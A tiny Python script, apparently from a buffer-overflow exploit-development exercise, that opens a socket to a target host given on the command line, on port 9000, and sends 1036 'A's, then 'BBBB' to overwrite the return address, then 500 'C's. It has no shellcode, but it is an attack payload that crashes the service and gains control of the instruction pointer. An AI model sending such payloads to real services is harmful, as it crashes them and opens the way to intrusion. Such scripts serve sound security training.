#!/usr/bin/python
import sys, socket

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

buffer = "A"*1036

buffer += "BBBB"

buffer += "C"*500

sock.send(buffer)

sock.close()
